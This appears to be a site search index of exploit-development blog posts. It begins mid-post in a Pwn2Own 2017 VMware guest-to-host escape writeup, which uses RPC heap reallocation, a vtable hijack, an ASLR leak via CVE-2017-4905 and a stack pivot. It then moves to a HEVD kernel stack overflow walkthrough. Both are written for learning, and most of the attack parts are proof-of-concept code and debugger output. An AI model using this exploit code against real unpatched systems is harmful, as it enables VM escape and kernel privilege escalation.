realloc():\n    inbuf = kernel32.VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n    memset(inbuf, 0x41, 0x80)\n    pointer = c_ulonglong(0x0000414141414141) # fake memory pointer\n    memmove(inbuf, addressof(pointer), 0x8)\n\n    chan = MESSAGE_CHANNEL()\n    OpenChannel(chan)\n    MessageSendSize(chan, 0xAA9)\n    MessageSendData(chan, inbuf, 0xAA9)\n    MessageClose(chan)\n</code></pre> <p>As you can see, we are now using the mentioned functions with a unique size which should help us locate the allocation on the heap from WinDbg. Before executing the updated POC we will set a breakpoint on WinDbg using .printf in order to track the heap allocations of our target size.</p> <pre><code>bp ntdll!RtlpAllocateHeap \".printf \\\"Req size: 0x%p Round size: 0x%p\\\", @r8, @r9; .echo; gc\"\n</code></pre> <p>Following this breakpoint, we run the POC until the input is requested in our script, at which point we break the application, set a breakpoint at <code>vmware_vmx+0x9d0aa</code> and then allow execution to continue. Eventually, we should see the following in our WinDbg output:</p> <pre><code>Req size: 0x0000000000000aaa Round size: 0x0000000000000ac0\nReq size: 0x00000000000000f8 Round size: 0x0000000000000100\nReq size: 0x0000000000000260 Round size: 0x0000000000000270\n\nBreakpoint 1 hit\nvmware_vmx+0x9d0aa:\n00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`0473d5c0=00007ff7e27a74a8\n</code></pre> <p>As shown in the first line, we can see that our allocation is in-fact rounded up to 0xAAA bytes due to the NULL byte terminator. Let's restart the VM, and now we can place a conditional breakpoint on <code>RtlpAllocateHeap</code> specifying 0xAAA as the allocation size.</p> <pre><code>bp ntdll!RtlpAllocateHeap \".if(@r8 == 0xAAA) {} .else {gc}\"\n</code></pre> <p>When executing the POC again, we should hit the breakpoint, then we can check the output of the registers and check the status of the heap.</p> <pre><code>ntdll!RtlpAllocateHeap:\n00007ffe`e886dad0 4c894c2420      mov     qword ptr [rsp+20h],r9 ss:00000000`0628f6d8=00000000010acec0\n\n0:013&gt; r\nrax=0000000001482038 rbx=0000000001480000 rcx=0000000001480000\nrdx=0000000000000002 rsi=0000000000000000 rdi=000000000000002c\nrip=00007ffee886dad0 rsp=000000000628f6b8 rbp=000000000628f7c0\n r8=0000000000000aaa  r9=0000000000000ac0 r10=7efefefefefefeff\nr11=8101010101010100 r12=0000000000000000 r13=0000000000000ac0\nr14=0000000000000000 r15=0000000000000aaa\niopl=0         nv up ei pl nz na pe nc\ncs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202\n\nntdll!RtlpAllocateHeap:\n00007ffe`e886dad0 4c894c2420      mov     qword ptr [rsp+20h],r9 ss:00000000`0628f6d8=00000000010acec0\n\n0:013&gt; pt\nntdll!RtlpAllocateHeap+0x235b:\n00007ffe`e886fe2b c3              ret\n\n0:013&gt; !heap -p -a rax\n    address 0000000004408d20 found in\n    _HEAP @ 1480000\n              HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state\n        0000000004408d10 00ac 0000  [00]   0000000004408d20    00aaa - (busy)\n\n0:013&gt; dq rax\n00000000`04408d20  00000000`0655fce0 00000000`04414600\n00000000`04408d30  00000000`80270000 00000000`00001000\n00000000`04408d40  00000000`d6b19000 00000000`00001000\n00000000`04408d50  00000000`80270000 00000000`00001000\n00000000`04408d60  00000000`80270000 00000000`00001000\n00000000`04408d70  00000000`80270000 00000000`00001000\n00000000`04408d80  00000000`80270000 00000000`00001000\n00000000`04408d90  00000000`d6a18000 00000000`00001000\n</code></pre> <p>In the above output, you can clearly see in R8 that our allocation size 0xAAA is present. Additionally, if we check the RAX register we can see that the state is \"busy\". Let's allow execution to continue for a few seconds before issuing a break and then reinspecting the allocation content.</p> <pre><code>0:016&gt; dq 04408d20\n00000000`04408d20  00000000`0682c100 00000000`046a0f20\n00000000`04408d30  41414141`41414141 41414141`41414141\n00000000`04408d40  41414141`41414141 41414141`41414141\n00000000`04408d50  41414141`41414141 41414141`41414141\n00000000`04408d60  41414141`41414141 41414141`41414141\n00000000`04408d70  41414141`41414141 41414141`41414141\n00000000`04408d80  41414141`41414141 41414141`41414141\n00000000`04408d90  41414141`41414141 41414141`41414141\n</code></pre> <p>As you can see, I didn't quite wait long enough for the full allocation, but it appears to have worked and we are clearly no longer restricted by the NULL bytes.</p> <p>If you're wondering why we aren't restricted by the NULL byte issue anymore is because these RPC commands don't expect a NULL terminated string as arguments. If you remember before, we were using the argument of an RPC command as our reallocation data. However those commands expect all their arguments to be NULL terminated strings, this causes an issue where our data will get mangled if it contains NULL bytes.</p> <p>There is one more thing we need to do. In our previous realloacation method we beat LFH randomisation by brute-forcing 0x40 allocations. We will reuse this technique and confirm that we have stable reallocation. First we update our POC to include 0x40 allocations.</p> <pre><code>    for i in range(0x40):\n        chan = MESSAGE_CHANNEL()\n        OpenChannel(chan)\n        MessageSendSize(chan, 0xAA9)\n        MessageSendData(chan, inbuf, 0xAA9)\n        MessageClose(chan)\n</code></pre> <p>Now let's set a breakpoint on vmware_vmx+0x9d0aa and verify that we have stable reallocation and can still include NULL bytes.</p> <pre><code>0:014&gt; bp vmware_vmx+0x9d0aa\n0:014&gt; g\n\n0:012&gt; dq rcx\n00000000`04429570  00007ff7`e27a74a8 00000000`04973730\n00000000`04429580  00000000`046c67e0 00000000`046c6b60\n00000000`04429590  00000000`04719060 00000000`00000003\n00000000`044295a0  00000000`cdbdc001 00000000`00000000\n00000000`044295b0  00000000`00000000 00000000`00000000\n00000000`044295c0  00000000`00000000 00000000`00000000\n00000000`044295d0  00000000`00000000 00000000`00000000\n00000000`044295e0  00000000`00000000 00000000`00000000\n</code></pre> <p>That doesn't seem to have worked. However, we previously were not using an allocation size of 0xAA9, we were in-fact using a size of 0xb0 for <code>MessageSendSize</code> and 0x80 for <code>MessageSendData</code>. So let's update these values back to their original and test the reallocation again.</p> <pre><code>0:013&gt; dd rcx\n00000000`045c2760  abb00ccd 00007ffa 41414141 41414141\n00000000`045c2770  41414141 41414141 41414141 41414141\n00000000`045c2780  41414141 41414141 41414141 41414141\n00000000`045c2790  41414141 41414141 41414141 41414141\n00000000`045c27a0  41414141 41414141 41414141 41414141\n00000000`045c27b0  41414141 41414141 41414141 41414141\n00000000`045c27c0  41414141 41414141 41414141 41414141\n00000000`045c27d0  41414141 41414141 41414141 41414141\n</code></pre> <p>Perfect, we have stable reallocation now. The next goal is for us to turn this into code execution.</p>","title":"Avoiding NULLs"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#code-execution","tags":["hypervisor-exploitation"],"text":"<p>Following the dereference shortly afterwards there is a CALL instruction on a RAX+8, we can verify this by checking the RIP register.</p> <pre><code>Breakpoint 0 hit\nvmware_vmx+0x9d0aa:\n00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`046e2b20=4141414141414141\n\n0:013&gt; u rip\nvmware_vmx+0x9d0aa:\n00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx]\n00007ff7`e209d0ad ba1a000000      mov     edx,1Ah\n00007ff7`e209d0b2 ff5008          call    qword ptr [rax+8]\n\n0:013&gt; p\nvmware_vmx+0x9d0b2:\n00007ff7`e209d0b2 ff5008          call    qword ptr [rax+8] ds:41414141`41414149=????????????????\n\n0:013&gt; g\n(7bc.27e8): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\nvmware_vmx+0x9d0b2:\n00007ff7`e209d0b2 ff5008          call    qword ptr [rax+8] ds:41414141`41414149=????????????????\n</code></pre> <p>This instruction represents a typical call to a virtual function through its vtable. When objects are created, the first QWORD is a pointer to the class' virtual function table. This table is an array of pointers to the object class' virtual functions which are used by the compiler to call the objects methods.</p> <p>Because we have successfully managed to perform reallocation of the object when the dereference occurs it is pointing to our data. This means that we can craft a fake object to redirect the application flow by hijacking the virtual function. In this case, we are hijacking the second virtual function. As the vtable address is located at 0x4141414141414141 and 0x4141414141414149 is the second virtual function in the table (offset 0x8). Before our reallocation this object was previously <code>dnd.setGuestFileRoot</code> the object we of course freed.</p>","title":"Code Execution"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#bypassing-dep","tags":["hypervisor-exploitation"],"text":"<p>Previous research shows that an RPC command <code>unity.window.contents.start</code> allows us to store arbitrary data provided as an argument in a vmware-vmx global variable. Storing the stack pivot gadget address in a global variable is perfect. However, to use the global variable as a vtable we need its absolute address. So we'll also need to bypass ASLR to calculate the variables offset from the base address.</p>","title":"Bypassing DEP"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#unitywindowcontentsstart","tags":["hypervisor-exploitation"],"text":"<p>There's no public documentation on this function, so we'll need to reverse it in order to understand where and how we can control that global variable. A simple text search returns the function in the same dispatcher table we looked at previously. Taking a brief look at the function in IDA, we see the following interesting block.</p>  <p></p>  <p>As you can see in the above screenshot, there are a number of overwrites of global variables which is congruent with the previous research we cited. Our goal at this stage is to work out if we control any of those overwrites and if we do, then we have ROP storage. To achieve that goal we'll need to work through the functions requirements and arrive in the block shown above.</p> <p>Fortunately, the function is quite a simple one. It only takes one argument.</p> <pre><code>cmd = create_string_buffer(\"unity.window.contents.start AAAABBBBCCCCDDDDEEEEFFFF\")\noutLen = c_ulong(0x1000)\noutbuf = kernel32.VirtualAlloc(0, outLen.value, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\nRpcSendRequest(addressof(cmd), sizeof(cmd) - 1, outbuf, pointer(outLen))\n</code></pre> <p>These checks simply check that the argument pointer and the size aren't NULL. Since we provided an argument we pass these two checks implicitly.</p>  <p></p>   <p></p>  <p>The next block is an important one because the return of <code>sub_4BE7C0</code> dictates the path of execution.</p>  <p></p>  <p>If we assume we don't take the jump, we hit the following error statement.</p>  <p></p>  <p>Clearly based on this we want to take the jump. So we need to confirm the execution of <code>sub_4be7c0</code> leads us to the jump. Paying close attention before the call to <code>sub_4be7c0</code> we see that <code>sub_4f9f00</code> is moved into R8. Inside <code>sub_4be7c0</code> we see that there is an indirect call made to RSI which contains <code>sub_4f9f00</code>.</p>  <p></p>  <p>Let's set a breakpoint on the call to <code>sub_4be7c0</code> and then set a hardware breakpoint on the pointer referencing our argument.</p> <pre><code>Breakpoint 0 hit\nvmware_vmx+0x85b36:\n00007ff6`3d4e5b36 e8857c4300      call    vmware_vmx!opus_decoder_destroy+0xbbc80 (00007ff6`3d91d7c0)\n\n0:013&gt; da rcx\n00000000`03ccfe3c  \"AAAABBBBCCCCDDDDEEEEFFFF\"\n\n0:013&gt; ba r1 00000000`03ccfe3c\n\n0:013&gt; g\nBreakpoint 1 hit\nvmware_vmx!opus_get_version_string+0x30d1f:\n00007ff6`3dbbbc7f ff158b240000    call    qword ptr [vmware_vmx!opus_get_version_string+0x331b0 (00007ff6`3dbbe110)]\nds:00007ff6`3dbbe110={WS2_32!htonl (00007ffc`a0cd39d0)}\n\n0:013&gt; r ecx\necx=41414141\n</code></pre> <p>Based on the output above we can see that the first DWORD is passed to htonl to switch the endianness. Since our DWORD is 0x41414141 this has no effect. Eventually we reach into the <code>sub_4f9f00</code> which checks if the first DWORD is equal to 1.</p>  <p></p>  <p>Following this check, we pass the check on DWORD 4 &amp; 5 implicitly.</p>  <p></p>  <p>The final check is a check on DWORD 6. DWORD 6 must be greater than zero but less than or equal to 0x8000000.</p>  <p></p>","title":"unity.window.contents.start"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#unitywindowcontentschunk","tags":["hypervisor-exploitation"],"text":"<p>With a successful overwrite of a QWORD in VMWares .data section for our pivot gadget. Our next goal is to find a location to store shellcode. According to previous research we can use the \"unity.window.contents.chunk\" command to copy data into a buffer that is allocated during \"unity.window.contents.start\".</p> <p>Following the reversing of this function, we learn a few things. Firstly, the first two DWORDs of the argument must contain a magic value 0x1. </p> <p>The second DWORD is a counter which is initially set to 0. It needs to be incremented and passed every time we make a call to \"unity.window.contents.chunk\".</p> <p>The third DWORD is used as an identifier and it needs to be the same value that is specified in the call to \"unity.window.contents.start\".</p> <p>The fifth DWORD is the size of the buffer that we are going to copy into the destination allocation. Although we can specify the size ourself, the maximum size we can copy is 0xC000 bytes. Additionally, the size specified in the fifth DWORD Must be a multiple of 4.</p> <p>In order to achieve all of this we'll write a new function \"fillMemory\", as shown below.</p> <pre><code>def fillMemory(index, buf, bufSize):\n    rounded_size = bufSize\n    if bufSize % 4 != 0:\n        rounded_size += 4 - (bufSize % 4)\n\n    chunk = kernel32.VirtualAlloc(0, 0x30 + rounded_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n    memset(chunk, 0, 0x30 + rounded_size)\n\n    cmd = create_string_buffer(\"unity.window.contents.chunk \")\n    memmove(chunk, addressof(cmd), 0x1c)\n\n    magicValue = c_ulong(htonl(1))\n    memmove(chunk + 0x1C, addressof(magicValue), 4)\n\n    memmove(chunk + 0x20, addressof(magicValue), 4)\n\n    id_value = c_ulong(htonl(0x43434343))\n    memmove(chunk + 0x24, addressof(id_value), 4)\n\n    index_value = c_ulong(htonl(index))\n    memmove(chunk + 0x28, addressof(index_value), 4)\n\n    size_value = c_ulong(htonl(rounded_size))\n    memmove(chunk + 0x2C, addressof(size_value), 4)\n\n    memmove(chunk + 0x30, buf, bufSize)\n\n    outLen = c_ulong(0x1000)\n    outbuf = kernel32.VirtualAlloc(0, outLen.value, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n    RpcSendRequest(chunk, 0x30 + rounded_size, outbuf, pointer(outLen))\n</code></pre>","title":"unity.window.contents.chunk"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#bypassing-aslr","tags":["hypervisor-exploitation"],"text":"<p>The next problem for us to solve is ASLR. We need the base address of vmware_vmx so that we can calculate the absolute address of the fake vtable and ROP gadget. Lucky for us, there is a CVE which targets our version, CVE-2017-4905.</p> <p>This CVE exploits a logic bug which allowed the disclosure of memory content, including function pointers. It was patched in VMSA-2017-0006.</p> <p>At a high level, the bug is quite simple. A buffer is allocated on the stack when processing backdoor requests. The buffer should be initialized in the BDOORHB callback but when requesting an invalid command, the callback doesn't correctly clear the buffer, causing content of the stack to be leaked to the guest. Below is a simple POC which exploits this CVE:</p> <pre><code>def leak():\n    buf = kernel32.VirtualAlloc(0, 0x8000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n    vmwareBase = 0\n    while True:\n        memset(buf, 0, 0x8000)\n        bphb = BACKDOOR_PROTO_HB()\n\n        bphb.cx = 0x8000\n        bphb.di = buf\n        bphb.bx = 2\n\n        Backdoor_HbIn(bphb)\n</code></pre> <p>The code is very simple. We issue a high-bandwidth backdoor request with an invalid command specified in EBX, and we supply a large output buffer in RDI. When the call takes place, VMWare stores some temporary data in the output buffer and as mentioned before, when the command fails and returns the application forgets to clear the output buffer, thus resulting in an information leak condition.</p> <p>Once we've obtained the raw data we need some way of filtering it. We are specifically looking to gather pointers that we can use in order to bypass ASLR. Since leaks are not often that reliable, and we know the starting value and ending value of the VMWare base address, we'll ensure that our leak continues to execute until those characters are found in the response.</p> <pre><code>Pointer = cast(buf + 0x7ef0, POINTER(c_ulonglong))\n        vmwarePointer = Pointer.contents.value\n\n        if vmwarePointer &amp; 0xFFFFFFF000000000 == 0x7ff000000000:\n            if vmwarePointer &amp; 0x000000000000FFFF == 0:\n                vmwareBase = vmwarePointer\n                break\n    return vmwareBase\n</code></pre> <p>If we execute this proof of concept, after a short while of waiting we will eventually receive the vmware_vmx base address which we can then use in order to build our ROP chain.</p>","title":"Bypassing ASLR"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#stack-pivot","tags":["hypervisor-exploitation"],"text":"<p>Before we can build our ROP chain, we still require control of the stack. To obtain that control we are going to employ the common technique of stack pivoting. Unfortunately in this case, no stack pivot gadget stands out right away so we will need to think creatively about how to achieve this.</p> <p>If we run our reallocation POC multiple times we notice that RDI (which points to data we control) always gets allocated at an address below 0x100000000. Values below this number are possible to fit into 32-bit subregisters, which means that if we can find a gadget such as the one shown below:</p> <pre><code>0:012&gt; u vmware_vmx+183429 L4\nvmware_vmx+0x183429:\n00007ff6`14e63429 8be7      mov     esp,edi\n</code></pre> <p>Then we could use it to pivot the stack and thus gain the necessary control to begin our ROP chain. RDI points to the \"dnd.setGuestFileRoot\" argument string, and this address will always fit into the lower 32-bits of RDI.</p> <p>To take advantage of this gadget, we need to write its address to the global variable that we control via the RPC commmand \"unity.window.contents.start\". Then we can modify the \"MessageSendData\" reallocation request to craft a fake vtable. Our crafted vtable will contain the pivot gadget address as the second virtual function pointer. We update our proof of concept as follows.</p> <pre><code>def realloc(addr):\n    print \"Address supplied is: \" + str(hex(addr))\n    inbuf = kernel32.VirtualAlloc(0, 0x80, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n    memset(inbuf, 0x41, 0x80)\n    pointer = c_ulonglong(addr)\n    memmove(inbuf, addressof(pointer), 0x8)\n\n    for i in range(0x40):\n        chan = MESSAGE_CHANNEL()\n        OpenChannel(chan)\n        MessageSendSize(chan, 0xb0)\n        MessageSendData(chan, inbuf, 0x80)\n        MessageClose(chan)\n\ndef fakeVFTable(addr):\n    cmd = create_string_buffer(\"unity.window.contents.start AAAABBBBCCCCDDDDEEEEFFFF\")\n    size = sizeof(cmd) - 1\n    fakeAddr = addr\n\n    RpcSendRequest(addressof(cmd), size, outbuf, pointer(outLen))\n\n\nvmwareBase = leak()\n\n# vmwareBase + 0x183429 = Pivot gadget Addr\nfakeVFTable(vmwareBase + 0x183429)\n\n# vmwareBase + 0xb870f8 = Fake vtable Addr\nrealloc(vmwareBase + 0xb870f8)\n</code></pre> <p>We'll place a breakpoint on the call instruction which causes the access violation and we'll follow the execution so we can verify that the stack pivot takes place.</p> <pre><code>Breakpoint 0 hit\nvmware_vmx+0x9d0b2:\n00007ff6`3d4fd0b2 ff5008          call    qword ptr [rax+8] ds:00007ff6`3dfe7100=00007ff63d5e3429\n\n0:013&gt; u 00007ff63d5e3429 L4\nvmware_vmx+0x183429:\n00007ff6`3d5e3429 8be7            mov     esp,edi\n00007ff6`3d5e342b 6500c3          add     bl,al\n00007ff6`3d5e342e 488d05d3b16500  lea     rax,[vmware_vmx!opus_get_version_string+0xb36a8 (00007ff6`3dc3e608)]\n00007ff6`3d5e3435 c3              ret\n\n0:013&gt; t\nvmware_vmx+0x183429:\n00007ff6`3d5e3429 8be7            mov     esp,edi\n\n0:013&gt; p\nvmware_vmx+0x18342b:\n00007ff6`3d5e342b 6500c3          add     bl,al\n\n0:013&gt; db esp L5\n00000000`04411ce5  42 42 42 42 42                                   BBBBB\n</code></pre> <p>Clearly, we have managed to gain control over the stack and we can now build a ROP chain in order to bypass DEP.</p>","title":"Stack Pivot"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#building-a-rop-chain","tags":["hypervisor-exploitation"],"text":"<p>We are going to use GetModuleHandle and GetProcAddress in order to dynamically resolve addresses and consequently dynmically resolve the address for WriteProcessMemory.</p> <p>For the sake of brevity, I am not going to include an entire ROP chain here. You can find examples online of ROP chains for this exploit so go try it! You'll learn a lot as there are some issues you'll run into!</p> <p>Hope you enjoy :)</p>","title":"Building a ROP Chain"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/","tags":["windows-kernel-exploitation"],"text":"","title":"HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#introduction","tags":["windows-kernel-exploitation"],"text":"<p>This post is a writeup of a simple Stack Buffer Overflow in HackSys Extreme Vulnerable Driver - we assume that you already have an environment setup to follow along. However, if you don't have an environment setup in this post we use:</p> <ul> <li>Windows 10 Pro x64 RS1</li> <li>HEVD 3.00</li> </ul> <p>If you are not sure how to setup a kernel debugging environment you can find plenty of posts of the process online, we will not cover the process in this post.</p>","title":"Introduction"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#reversing-the-driver","tags":["windows-kernel-exploitation"],"text":"<p>The first challenge we need to tackle is finding the IRP handler this will take the form of being a function with a huge switch case in it. Since HEVD is a relatively small driver it is quite easy to find. In larger drivers this can of course be more tricky but we won't cover that here.</p>","title":"Reversing the Driver"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#locating-the-irp-handler","tags":["windows-kernel-exploitation"],"text":"<p>The IRP handler in HEVDv3 is located at <code>sub_140085078</code> and as stated above the function is quite a large switch case which eventually leads to all of our different IOCTL handlers. The below image shows the graph overview of the IRP handler. We will refer to this handler function as <code>IrpDeviceIoCtlHandler</code> from this point onwards.</p>  <p> </p> IRP Handler Graph  <p>Now that we've located the IRP handler we can begin reversing.</p>","title":"Locating the IRP Handler"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#locating-the-ioctl-handler","tags":["windows-kernel-exploitation"],"text":"<p>In a real world scenario we would have to reverse each of these switched to functions to find a vulnerable one, in this case we know they're all vulnerable and I've already found the routine we are targetting in this blog post from doing a string search of \"Buffer overflow\". <code>loc_14008522F</code> is the entrypoint to our target function which is shown in the below figure.</p>  <p> </p> Entrypoint to target function  <p>In the above image I've already renamed the IOCTL handler routine as <code>BufferOverflowStackIoctlHandler</code> (or <code>sub_140086594</code> if you're following along) Let's open the function and look at it in some more detail.</p>  <p> </p> IOCTL Handler Function  <p>The target function is quite small because it calls into the vulnerable function, labelled as <code>TriggerBufferOverflowStack</code> in the above image (or <code>sub_1400865B4</code> if you're following along).</p>","title":"Locating the IOCTL Handler"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#reversing-the-vulnerable-function","tags":["windows-kernel-exploitation"],"text":"<p>Finally we've arrived in the vulnerable function and we can begin looking for the vulnerability. The below code block is the decompilation of the vulnerable function. Its been cleaned up for readability.</p> Vulnerable Function<pre><code>TriggerBufferOverflowStack(volatile void *Address, SIZE_T a2)\n{\n  char Dst[2048]; // (2)\n\n  memset(Dst, 0, sizeof(Dst));\n  ProbeForRead(Address, 0x800, 1);\n  DbgPrintEx(0x4D, 3, \"[+] UserBuffer: 0x%p\\n\", (const void *)Address);\n  DbgPrintEx(0x4D, 3, \"[+] UserBuffer Size: 0x%X\\n\", a2);\n  DbgPrintEx(0x4D, 3, \"[+] KernelBuffer: 0x%p\\n\", Dst);\n  DbgPrintEx(0x4D, 3, \"[+] KernelBuffer Size: 0x%X\\n\", 2048);\n  DbgPrintEx(0x4D, 3, \"[+] Triggering Buffer Overflow in Stack\\n\");\n  RtlCopyMemory(Dst, (const void *)Address, a2); // (1)\n  return 0;\n}\n</code></pre> <ol> <li>There is no size check on the value of <code>a2</code> and since this value is controlled by us we can specify a size greater than 2048.</li> <li>This is a statically allocated buffer of 2048 bytes in kernel mode. The size here is important.</li> </ol> <p>The function itself is extremely simple, we have a stack allocated buffer <code>Dst</code> which is of size 2048 bytes. Then a <code>ProbeForRead</code> is performed, this function checks that a user-mode buffer is present in the given address. So far so good.</p> <p>Moving down the function we can see an <code>RtlCopyMemory</code> call the bright-eyed among you might notice the issue here straight away. If you're unfamilar <code>RtlCopyMemory</code> does exactly what you imagine, it copies a buffer from a source block to a destination block. </p> <p>We can see that our stack allocated buffer <code>Dst</code> is being used as the destination, the source is <code>Address</code> which is our user-mode buffer and the length of bytes to copy is specified by <code>a2</code>, however, at no point is there a check on whether the contents of <code>Address</code> fits inside <code>Dst</code> and thus if we can make our user-mode buffer greater than 2048 bytes we will have a classic stack buffer overflow. We can confirm the same story in the assembly view.</p> <pre><code>0000000140086673 mov     r8, rsi             ; Length\n0000000140086676 mov     rdx, rdi            ; Source\n0000000140086679 lea     rcx, [rsp+838h+Dst] ; void *\n000000014008667E call    RtlCopyMemory       ; Call Procedure\n</code></pre>","title":"Reversing the Vulnerable Function"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#summary","tags":["windows-kernel-exploitation"],"text":"<p>To summarise the vulnerability is a classic stack buffer overflow due to a lack of size check on a copy from user-mode to a kernel-mode buffer. The vulnerable function has a stack allocated buffer of 2048 bytes - as long as we can provide a buffer greater than 2048 bytes then we will be able to overflow the buffer and gain stack control.</p>","title":"Summary"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#dynamic-analysis","tags":["windows-kernel-exploitation"],"text":"<p>Now that we've found the vulnerability statically its time to try and prove that it is exploitable - to do that we're going to use WinDbg to step through the vulnerable function and verify that we can send a buffer greater than 2048 bytes and get stack control as a result.</p>","title":"Dynamic Analysis"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#interacting-with-the-driver","tags":["windows-kernel-exploitation"],"text":"<p>In order to begin dynamic analysis we'll need to build a way of interacting with the driver and sending it IOCTLs. You can use any language to do this but we're going to use C because:</p> <ol> <li>It is really nice to use when working with Windows </li> <li>Python3 ctypes absolutely sucks for this kind of thing</li> <li>Exploit portability</li> </ol> <p>The below code block is a very simple C program to interact with the driver - if you're unfamilar with the Windows API then the two most important sections of code to be aware of are <code>CreateFileA</code> and <code>DeviceIoControl</code>.</p> <pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#define DRIVER \"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\"\n\nvoid exploit()\n{\n    HANDLE DriverHandle;\n    DWORD  OldProtect;\n    char   buffer[2048] = {0};\n\n    printf(\"[*] Preparing exploit buffer!\\n\");\n    /* Fill exploit buffer with As. */\n    memset(buffer, 0x41, sizeof(buffer));\n\n    printf(\"[*] Opening handle to %s\\n\", DRIVER);\n    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (DriverHandle == INVALID_HANDLE_VALUE) \n    {\n        printf(\"[!] FATAL: Could not open HEVD handle!\\n\");\n        return;\n    }\n\n    if (!DeviceIoControl(DriverHandle, 0x222003, buffer, sizeof(buffer), NULL, 0, NULL, NULL))\n    {\n        printf(\"[!] FATAL: Error sending IOCTL to driver!\\n\");\n        return;\n    }\n}\n\nint main()\n{\n    printf(\"[+] HEVD: Stack Buffer Overflow!\\n\");\n    exploit();\n\n    return 0;\n}\n</code></pre> <p>For the purposes of debugging and explaining I imported the HEVD symbol file into WinDbg so that we can workaround ASLR.</p>  Tip <p>If you're following along I'd recommend that you do as above and import the HEVD symbol file into WinDbg.</p>","title":"Interacting with the Driver"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#verifying-input-and-size","tags":["windows-kernel-exploitation"],"text":"<p>Remember in order to cause a buffer overflow we need to overflow the stack allocated buffer of 2048 bytes, to do this we need to confirm that we can give a size of more than this. If you recall the function <code>TriggerBufferOverflowStack</code> takes two arguments, a user-mode address where our buffer is stored and a size argument. If we set a breakpoint on <code>BufferOverflowStackIoctlHandler</code> we can step through to the call to the vulnerable function and check our given arguments validity.</p> <pre><code>0: kd&gt; bp HEVD!BufferOverflowStackIoctlHandler\n\n0: kd&gt; g\nBreakpoint 0 hit\nHEVD!BufferOverflowStackIoctlHandler:\nfffff808`c1c16594 4883ec28        sub     rsp,28h\n\n0: kd&gt; p\nHEVD!BufferOverflowStackIoctlHandler+0x4:\nfffff808`c1c16598 488b4a20        mov     rcx,qword ptr [rdx+20h]\n\n1: kd&gt; p\nHEVD!BufferOverflowStackIoctlHandler+0xd:\nfffff808`c1c165a1 8b5210          mov     edx,dword ptr [rdx+10h]\n\n1: kd&gt; dq rcx\n00000000`0061f6e8  41414141`41414141 41414141`41414141\n00000000`0061f6f8  41414141`41414141 41414141`41414141\n00000000`0061f708  41414141`41414141 41414141`41414141\n00000000`0061f718  41414141`41414141 41414141`41414141\n00000000`0061f728  41414141`41414141 41414141`41414141\n00000000`0061f738  41414141`41414141 41414141`41414141\n00000000`0061f748  41414141`41414141 41414141`41414141\n00000000`0061f758  41414141`41414141 41414141`41414141\n\n1: kd&gt; dq rdx+10\nffffc58f`40f84dc0  00000000`00000800 00000000`00222003\n[...]\n</code></pre> <p>The above figure shows clearly that we do have complete control of these arguments. The first instruction of interest is <code>HEVD!BufferOverflowStackIoctlHandler+0x4</code> where our user-mode address is moved from <code>rdx+20</code> into <code>rcx</code>. The next instruction of interest is immediately after at <code>HEVD!BufferOverflowStackIoctlHandler+0xd</code> where the size of our user-mode buffer is moved from <code>rdx+10</code> to <code>edx</code>. We then dump those arguments to verify.</p>","title":"Verifying Input and Size"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#exploitation","tags":["windows-kernel-exploitation"],"text":"<p>Now that we've verified we control both arguments to the vulnerable function unconditionally we can move forward with gaining control of the return address.</p>","title":"Exploitation"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#gaining-control-of-the-return-address","tags":["windows-kernel-exploitation"],"text":"<p>In order to figure out where we gain control we can use a number of methods such as using a cylic pattern. </p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ msf-pattern_create -l 2100\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ msf-pattern_offset -l 2100 -q 4332724331724330 \n[*] Exact match at offset 2072\n</code></pre> <p>Based on the above we see that we gain control of the return address at 2072 bytes. We'll update our code accordingly.</p> <pre><code>void exploit()\n{\n    HANDLE DriverHandle;\n    DWORD  OldProtect;\n    char   buffer[2072 + 8] = {0};\n    const size_t offset = 2072;\n\n    printf(\"[*] Preparing exploit buffer!\\n\");\n    /* Fill exploit buffer with As. */\n    memset(buffer, 0x41, sizeof(buffer));\n\n    memcpy(&amp;buffer[offset], \"BBBBBBBB\", 8);\n</code></pre> <p>We can run our POC again and verify that we gain control of the return address as shown in the below.</p> 